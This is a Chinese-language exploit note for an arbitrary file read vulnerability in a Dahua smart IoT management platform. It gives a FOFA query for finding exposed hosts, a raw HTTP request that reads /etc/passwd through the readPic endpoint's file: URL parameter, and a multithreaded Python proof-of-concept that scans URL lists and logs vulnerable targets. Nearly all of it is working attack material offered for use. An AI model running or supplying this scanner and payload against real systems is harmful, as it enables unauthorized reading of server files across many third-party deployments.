### fofa

```markdown
body="*客户端会小于800*"
```

### payload

```markdown
GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![image-20240909214825158](https://fhc-1328696168.cos.ap-beijing.myqcloud.com/image-20240909214825158.png)



### 命令

```markdown
python3 脚本文件名 -u url			  # 测试单个url
python3 脚本文件名 -f url.txt          # 测试多个url
```

### poc

```python
import requests, sys, argparse, time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    banner = """
   
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-09
                                                    version: 1.0
                                                    author: hulless-oat
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智能物联综合管理平台存在env任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        # 多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive',
    }
    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=15)
        if res.status_code == 200 and "root" in res.text:
            print(f"[+]{GREEN}该url存在任意文件读取漏洞: {target}{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
                return True
        else:
            print(f"[-]该url不存在任意文件读取漏洞")
    except:
        print(f"[*]该url存在问题")
        return False

if __name__ == '__main__':
    main()
```

